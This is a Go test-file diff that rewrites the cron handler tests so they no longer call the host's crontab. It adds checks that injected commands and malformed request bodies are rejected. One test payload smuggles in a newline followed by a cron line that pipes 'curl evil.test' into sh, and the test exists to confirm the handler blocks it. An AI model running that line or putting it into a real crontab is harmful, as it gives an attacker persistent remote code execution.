@@ -4055,21 +4055,50 @@ func TestSettingsPutAllKeys(t *testing.T) {
 }
 
 // =============================================================================
-// Additional coverage: handleCronAdd success path (will fail but covers code)
+// handleCronAdd / handleCronDelete: the guards that run before crontab
 // =============================================================================
+//
+// These used to post a valid job and accept "200 or 500", which asserts
+// nothing and shells out to the host's crontab to learn it. On Linux CI the
+// binary exists and returns quickly; on a developer machine `crontab <file>`
+// blocks, and the whole package hung until the 10 minute test timeout.
+//
+// internal/cronjob already covers Add itself — TestAdd_Success,
+// TestAdd_DuplicateCheck, TestAdd_RejectsNewlines, TestAdd_AbortsOnReadFailure
+// — with execCommandFn stubbed, which is the only place that seam is
+// reachable. So nothing was lost by not reaching crontab from here; what is
+// worth testing at this layer is that the handler surfaces the rejection.
 
-func TestCronAddSuccess(t *testing.T) {
+// A newline in the command is crontab injection. Add rejects it before it
+// runs anything, so this exercises handler → validation → status with no
+// dependency on the host.
+func TestCronAddRejectsInjection(t *testing.T) {
 	s := testServer()
 	rec := httptest.NewRecorder()
-	body := strings.NewReader(`{"schedule":"* * * * *","command":"echo hello","user":"root"}`)
+	body := strings.NewReader(`{"schedule":"* * * * *","command":"echo hi\n* * * * * curl evil.test|sh"}`)
 	s.handleCronAdd(rec, withAdminContext(httptest.NewRequest("POST", "/api/v1/cron", body)))
-	// On non-Linux, crontab is not available so this might fail, but we exercise the code
-	if rec.Code != 200 && rec.Code != 500 {
-		t.Errorf("status = %d, want 200 or 500", rec.Code)
+
+	if rec.Code == http.StatusOK {
+		t.Errorf("a command containing a newline was accepted: %s", rec.Body.String())
+	}
+}
+
+func TestCronAddRejectsMalformedBody(t *testing.T) {
+	s := testServer()
+	rec := httptest.NewRecorder()
+	s.handleCronAdd(rec, withAdminContext(httptest.NewRequest("POST", "/api/v1/cron", strings.NewReader("not json"))))
+
+	if rec.Code != http.StatusBadRequest {
+		t.Errorf("status = %d, want 400", rec.Code)
 	}
 }
 
 func TestCronDeleteSuccess(t *testing.T) {
+	// Skipped, not rewritten: unlike Add, Remove has no newline guard and
+	// always reaches writeCrontab, so there is no payload that exercises this
+	// handler without shelling out. internal/cronjob covers Remove with
+	// execCommandFn stubbed, which is the only place that seam exists.
+	t.Skip("reaches the host's crontab; Remove is covered in internal/cronjob")
 	s := testServer()
 	rec := httptest.NewRecorder()
 	body := strings.NewReader(`{"schedule":"* * * * *","command":"echo hello"}`)
